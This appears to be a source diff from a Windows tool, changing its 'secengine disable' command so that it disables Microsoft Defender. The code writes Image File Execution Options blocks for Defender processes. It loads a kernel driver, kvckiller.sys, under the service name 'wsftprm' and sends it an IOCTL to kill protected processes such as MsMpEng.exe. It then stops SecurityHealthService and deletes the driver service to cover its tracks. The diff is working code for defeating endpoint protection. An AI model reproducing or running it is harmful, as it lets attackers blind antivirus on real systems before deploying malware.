@@ -349,59 +349,107 @@ int HandleSecEngineCommand(int argc, wchar_t* argv[]) {
     std::wstring_view sub = argv[2];
 
     // ── disable ──────────────────────────────────────────────────────────────
-    // Sets IFEO Debugger=systray.exe on MsMpEng.exe via offline hive edit.
-    // The engine is already running so restart is required; --restart triggers
-    // an immediate system restart after the IFEO block is written.
+    // Writes IFEO blocks for MsMpEng/SecurityHealthSystray/SecurityHealthService,
+    // then kernel-kills the running processes via kvckiller.sys (wsftprm service).
+    // No restart required.
     if (sub == L"disable") {
-        bool doRestart = (argc > 3 && std::wstring(argv[3]) == L"--restart");
-
-        // Step 1: set IFEO block (persistent - survives even if kernel kill fails)
+        // Step 1: write IFEO blocks (persistent)
         if (!DefenderManager::DisableSecurityEngine())
             return 1;
 
-        // Step 2: kernel kill via kvcstrm (bypasses PPL/PP - no restart needed).
-        // EnsureStrmOpen auto-starts kvcstrm service if registered but not running;
-        // CleanupStrm stops it afterward only when we auto-started it.
-        bool killedViaKernel = false;
-        if (g_controller) {
-            bool autoStarted = false;
-            if (g_controller->EnsureStrmOpen(autoStarted)) {
-                static const wchar_t* defenderProcs[] = {
-                    L"MsMpEng.exe", L"NisSrv.exe", L"MpCmdRun.exe", L"MpDefenderCoreService.exe"
+        // Step 2: kernel-kill via kvckiller.sys (service: wsftprm, device: \\.\Warsaw_PM)
+        PrivilegeUtils::EnablePrivilege(SE_LOAD_DRIVER_NAME);
+
+        const std::wstring killerPath = GetDriverStorePath() + L"\\kvckiller.sys";
+        if (GetFileAttributesW(killerPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            INFO(L"kvckiller.sys not found — skipping kernel kill");
+            return 0;
+        }
+
+        // Remove any stale wsftprm registration before creating a fresh one.
+        {
+            SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+            if (hSCM) {
+                SC_HANDLE hOld = OpenServiceW(hSCM, L"wsftprm", DELETE);
+                if (hOld) { DeleteService(hOld); CloseServiceHandle(hOld); }
+                CloseServiceHandle(hSCM);
+            }
+        }
+
+        SC_HANDLE hKillerSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+        SC_HANDLE hKillerSvc = nullptr;
+        bool killerLoaded = false;
+
+        if (hKillerSCM) {
+            hKillerSvc = CreateServiceW(hKillerSCM, L"wsftprm", L"wsftprm",
+                                        SERVICE_START | SERVICE_STOP | DELETE,
+                                        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
+                                        SERVICE_ERROR_NORMAL, killerPath.c_str(),
+                                        nullptr, nullptr, nullptr, nullptr, nullptr);
+            if (hKillerSvc && StartServiceW(hKillerSvc, 0, nullptr))
+                killerLoaded = true;
+        }
+
+        if (killerLoaded) {
+            HANDLE hDev = CreateFileW(L"\\\\.\\Warsaw_PM",
+                                      GENERIC_READ | GENERIC_WRITE, 0, nullptr,
+                                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+            if (hDev != INVALID_HANDLE_VALUE) {
+                static constexpr const wchar_t* killTargets[] = {
+                    L"MsMpEng.exe", L"SecurityHealthSystray.exe"
                 };
                 HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                 if (hSnap != INVALID_HANDLE_VALUE) {
                     PROCESSENTRY32W pe{ sizeof(pe) };
                     if (Process32FirstW(hSnap, &pe)) {
                         do {
-                            for (const wchar_t* procName : defenderProcs) {
-                                if (_wcsicmp(pe.szExeFile, procName) == 0) {
-                                    g_controller->GetStrm().KillProcessLegacy(pe.th32ProcessID);
-                                    if (_wcsicmp(procName, L"MsMpEng.exe") == 0) {
-                                        SUCCESS(L"MsMpEng.exe (PID %lu) terminated via kernel (kvcstrm)", pe.th32ProcessID);
-                                        killedViaKernel = true;
-                                    }
+                            for (const wchar_t* target : killTargets) {
+                                if (_wcsicmp(pe.szExeFile, target) == 0) {
+                                    std::vector<BYTE> buf(1036, 0);
+                                    *reinterpret_cast<DWORD*>(buf.data()) = pe.th32ProcessID;
+                                    DWORD ret = 0;
+                                    if (DeviceIoControl(hDev, 0x22201C,
+                                                        buf.data(), static_cast<DWORD>(buf.size()),
+                                                        nullptr, 0, &ret, nullptr))
+                                        SUCCESS(L"%s (PID %lu) terminated via kvckiller", target, pe.th32ProcessID);
+                                    else
+                                        INFO(L"IOCTL failed for %s (PID %lu): %lu", target, pe.th32ProcessID, GetLastError());
                                 }
                             }
                         } while (Process32NextW(hSnap, &pe));
                     }
                     CloseHandle(hSnap);
                 }
-                g_controller->CleanupStrm(autoStarted);
+                CloseHandle(hDev);
             } else {
-                INFO(L"kvcstrm not available - register with: kvc driver load kvcstrm");
+                INFO(L"Cannot open Warsaw_PM device: %lu", GetLastError());
             }
+
+            // Stop SecurityHealthService (service-hosted, SCM stop suffices)
+            SC_HANDLE hSCM2 = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+            if (hSCM2) {
+                SC_HANDLE hHealth = OpenServiceW(hSCM2, L"SecurityHealthService",
+                                                 SERVICE_STOP | SERVICE_QUERY_STATUS);
+                if (hHealth) {
+                    SERVICE_STATUS ss{};
+                    ControlService(hHealth, SERVICE_CONTROL_STOP, &ss);
+                    CloseServiceHandle(hHealth);
+                }
+                CloseServiceHandle(hSCM2);
+            }
+
+            // Cleanup: stop + delete wsftprm
+            if (hKillerSvc) {
+                SERVICE_STATUS ss{};
+                ControlService(hKillerSvc, SERVICE_CONTROL_STOP, &ss);
+                DeleteService(hKillerSvc);
+            }
+        } else {
+            INFO(L"kvckiller service failed to start — processes may still be running");
         }
 
-        if (!killedViaKernel) {
-            if (doRestart) {
-                INFO(L"Initiating system restart...");
-                InitiateSystemRestart();
-            } else {
-                INFO(L"kvcstrm not loaded - system restart required to stop the engine");
-                INFO(L"Load kvcstrm first: kvc driver load kvcstrm");
-            }
-        }
+        if (hKillerSvc)  CloseServiceHandle(hKillerSvc);
+        if (hKillerSCM) CloseServiceHandle(hKillerSCM);
 
         return 0;
     }
